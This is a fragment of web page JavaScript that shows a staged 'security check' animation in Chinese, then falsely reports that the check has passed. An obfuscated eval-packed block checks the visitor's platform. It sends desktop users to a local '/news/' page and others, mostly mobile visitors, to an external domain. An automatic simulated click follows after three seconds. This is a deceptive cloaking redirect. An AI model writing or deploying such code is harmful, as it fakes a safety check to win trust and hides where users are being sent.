 var it = document.getElementById('iconText');
    var _i = 1;
    var si = setInterval(function () {
      var txt = '正在安全检测';
      for (var i = 0; i < _i; i++) txt += '.';
      it.innerText = txt;
      if (++_i > 3) {
        clearInterval(si);
        setTimeout(function () {
          var icon = document.getElementById('icon');
          var subText = document.getElementById('subText');
          icon.classList.add("weui-icon-success");
          it.innerHTML = "已通过安全检测";
          subText.innerHTML = "如果没有自动跳转，请点击下方按钮前往";
        }, 300);
      }
    }, 300);
//判断
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('l b(){3 1={};3 p=7.a;3 f=7.e;1.5=p.2("h")==0;1.6=p.2("g")==0;1.d=(p=="c")||(p.2("q")==0);o(1.5||1.6||1.s){4.9.8=\'/r/\'}j{4.9.8=" i://k.n/m"}}',29,29,'|system|indexOf|var|window|win|mac|navigator|href|location|platform|RuPage|X11|x11|userAgent|u|Mac|Win|https|else|111111|function||plus|if||Linux|news|xll'.split('|'),0,{}))

//点击事件
setTimeout(function() {
     // IE
     if(document.all) {
         document.getElementById("clickMe").click();
     }
     // 其它浏览器
     else {
         var e = document.createEvent("MouseEvents");
         e.initEvent("click", true, true);
         document.getElementById("clickMe").dispatchEvent(e);
     }
}, 3000);
